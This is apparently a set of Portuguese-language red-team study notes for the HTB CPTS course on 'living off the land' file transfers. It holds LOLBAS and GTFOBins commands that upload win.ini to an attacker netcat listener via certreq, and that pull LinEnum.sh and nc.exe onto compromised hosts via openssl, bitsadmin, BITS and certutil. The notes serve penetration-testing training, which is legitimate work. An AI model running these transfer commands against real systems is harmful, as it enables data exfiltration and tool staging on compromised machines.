> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/file-transfers/living-off-the-land.md).

# Living off The Land

#### Usando o Projeto LOLBAS e GTFOBins

**LOLBAS**

* Para procurar funções de download e upload no [LOLBAS](https://lolbas-project.github.io/) podemos usar `/download`ou `/upload`.
* **Carregue win.ini para nossa Pwnbox**

```sh
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

* **Arquivo recebido em nossa sessão Netcat**

```
sudo nc -lvnp 8000
```

#### GTFOBins

* **Crie um certificado em nossa Pwnbox**

```sh
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

* **Levante o servidor em nossa Pwnbox**

```
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

* **Baixar arquivo da máquina comprometida**

```sh
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

***

#### Other Common Living off the Land tools

* **File Download with Bitsadmin**

```sh
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

* **Download**

```
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

* **Baixe um arquivo com Certutil**

```sh
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
